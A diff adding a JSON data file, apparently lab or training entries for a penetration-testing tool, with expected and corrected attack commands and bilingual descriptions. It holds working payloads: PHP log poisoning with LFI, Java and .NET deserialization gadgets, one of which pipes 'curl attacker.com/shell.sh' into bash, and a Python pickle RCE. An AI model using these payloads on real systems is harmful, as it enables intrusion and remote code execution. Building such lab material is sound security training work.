@@ -1,0 +1,68 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "rce-log-poison",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "curl -A \"<?php eval(\\$_POST['cmd']);?>\" http://{LAB_APP}/\n?file=/var/log/apache2/access.log&cmd=whoami\n?file=/var/log/httpd/access_log&cmd=whoami",
+          "command": "curl -A \"<?php eval($_REQUEST['cmd']);?>\" http://{LAB_APP}/\n?file=/var/log/apache2/access.log&cmd=whoami\n?file=/var/log/httpd/access_log&cmd=whoami",
+          "description": {
+            "zh": "以带 PHP eval 标记的 User-Agent 请求目标使其写入访问日志，再经文件包含参数加载该日志并传入 cmd 参数验证代码执行。命中判据：包含日志并传入 cmd=whoami 后响应输出当前用户名。",
+            "en": "Send a PHP-tagged User-Agent that is written to the access log, then include the log through the file parameter and pass a cmd parameter to verify execution. Success check: including the log with cmd=whoami prints the current username."
+          },
+          "title": {
+            "zh": "投毒 User-Agent 并经 LFI 包含访问日志",
+            "en": "Poison the User-Agent and include the access log via LFI"
+          }
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "curl -A \"<?php eval(\\$_POST['cmd']);?>\" http://{LAB_APP}/\n?file=/var/log/nginx/access.log&cmd=whoami",
+          "command": "curl -A \"<?php eval($_REQUEST['cmd']);?>\" http://{LAB_APP}/\n?file=/var/log/nginx/access.log&cmd=whoami",
+          "description": {
+            "zh": "对 Nginx 访问日志路径重复同一包含流程，确认不同服务器日志布局下的包含可达性。命中判据：Nginx 日志包含后同样返回命令输出。",
+            "en": "Repeat the same inclusion flow against the Nginx access log path to confirm reachability across server log layouts. Success check: including the Nginx log likewise returns command output."
+          },
+          "title": {
+            "zh": "对 Nginx 日志路径重复包含验证",
+            "en": "Repeat inclusion against the Nginx log path"
+          }
+        }
+      ]
+    },
+    {
+      "id": "rce-deserialize",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "java -jar ysoserial.jar CommonsCollections1 \"curl attacker.com/shell.sh|bash\"",
+          "command": "java -jar ysoserial.jar CommonsCollections1 \"curl {ATTACKER_HOST}/shell.sh|bash\"",
+          "description": {
+            "zh": "以 CommonsCollections1 链生成执行 curl 下载并管道给 bash 的序列化载荷，验证 Java 反序列化点可触发命令执行。命中判据：攻击者 HTTP 日志收到目标对 shell.sh 的请求，或目标侧出现对应命令执行痕迹。",
+            "en": "Generate a CommonsCollections1 serialized payload that pipes a downloaded script into bash, verifying the Java deserialization sink reaches command execution. Success check: the attacker HTTP log records the target fetching shell.sh, or the target shows the corresponding command-execution trace."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "ysoserial.net -g ObjectDataProvider -f Json.Net -c \"calc.exe\"",
+          "description": {
+            "zh": "以 ObjectDataProvider gadget 配合 Json.Net 格式生成弹出 calc.exe 的 .NET 反序列化载荷，验证 Json.NET 反序列化点可触发执行。命中判据：目标主机出现计算器进程。",
+            "en": "Generate a .NET deserialization payload that launches calc.exe with the ObjectDataProvider gadget in Json.Net format, verifying the Json.NET sink triggers execution. Success check: a calculator process appears on the target host."
+          }
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "import pickle\nimport os\nclass Exploit:\ndef __reduce__(self):\nreturn (os.system, ('whoami',))\npayload = pickle.dumps(Exploit())",
+          "command": "import pickle\nimport os\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('whoami',))\npayload = pickle.dumps(Exploit())"
+        }
+      ]
+    }
+  ]
+}
